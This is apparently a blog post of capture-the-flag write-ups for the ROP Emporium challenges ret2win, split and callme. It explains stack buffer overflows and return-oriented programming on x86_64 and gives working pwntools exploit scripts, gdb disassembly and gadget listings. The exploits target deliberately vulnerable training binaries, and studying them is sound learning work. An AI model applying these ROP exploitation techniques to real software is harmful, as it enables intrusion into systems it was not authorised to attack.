---
layout: default
title: "ROP emporium"
category: "pwn"
tags: [x86_64, rop]
date: 2026-09-09
description: "my solutions for the challenges of the ROP emporium series"
---

* TOC
{:toc}

## ret2win
basic ret2win challenge, no mitigations
our input length is not properly checked, which results
to a return address overwrite to point to win()

```python
from pwn import *
p = process('./ret2win')

payload = b'A'*40 + p64(0x400756)
p.recvuntil(b'> ')
p.send(payload)

p.interactive()
```

## split
in this challenge one thing changes
1. there is no win() function

however, according to the challenge description there is a ready to use `'/bin/cat flag.txt'`.
paired with a `system()` call and a `pop rdi; ret` gadget, a pop rdi gadget basically loads
anything we want in the rdi register which according to the x86_x64 calling convention is the first
argument of any function, so what we want to do with the info we are given is to call `system('/bin/cat flag.txt')`,

we had to find the addresses for the pop rdi gadget, the system call and the string we need to use through gdb,
thankfully there are intentionally placed functions and strings in the binary which give us these for free:
```
pwndbg> disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
```
```
pwndbg> x/gs &usefulString
0x601060 <usefulString>:        "/bin/cat flag.txt"
```
```
$ ROPgadget --binary split --only "pop|ret"
Gadgets information
============================================================
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret <------ this is the gadget we want
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a

Unique gadgets found: 12
```

we finally construct the solve script using these addresses:

```python
from pwn import *

elf = ELF('./split')
io = process(elf.path)
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
call_system = 0x40074b
cat_flag = 0x601060

payload = flat(
	b'A' * 40,
	p64(pop_rdi),
	p64(cat_flag),
	p64(call_system)
)

io.send(payload)
io.interactive()
```

## callme
this challenge tasks us with calling 3 different plt function entries with 3 arguments

-  the plt (procedure linkage table) is a mechanism which links our executable code with external libraries' code, because of aslr, external libraries are always loaded into random memory addresses, the plt uses predictable addresses to call those external functions so the compiler doesn`t need to guess the addresses, the good thing about the plt is that in the end we don't need to guess them to write our exploit neither (except if PIE is enabled, but it doesn't matter for this challenge as it is turned off)

we are asked to call `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

since we don't know the actuall addresses of these functions in the external library we leverage the plt which uses fixed addresses (no PIE), we also apply the same concept from the previous challenge except we have to
use three arguments, in the x86_64 calling convention the first 3 arguments of a function are in this order rdi, rsi, rdx, with rdi being the first argument and rdx being the 3rd, we construct the final solve script based
on these principles:

```python
from pwn import *

context.log_level = 'debug'

elf = ELF('./callme')
rop = ROP(elf)
io = process(elf.path)

offset = 40

pop_rdi_rsi_rdx = rop.find_gadget(['pop rdi','pop rsi','pop rdx','ret'])[0]

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

callme_one_plt = elf.plt['callme_one']
callme_two_plt = elf.plt['callme_two']
callme_three_plt = elf.plt['callme_three']

payload = b'A' * offset

def build_call(func):
	chain = p64(pop_rdi_rsi_rdx)
	chain += p64(arg1)
	chain += p64(arg2)
	chain += p64(arg3)
	chain += p64(func)
	return chain

payload += build_call(callme_one_plt)
payload += build_call(callme_two_plt)
payload += build_call(callme_three_plt)

io.sendlineafter(b'> ', payload)
io.interactive()
```



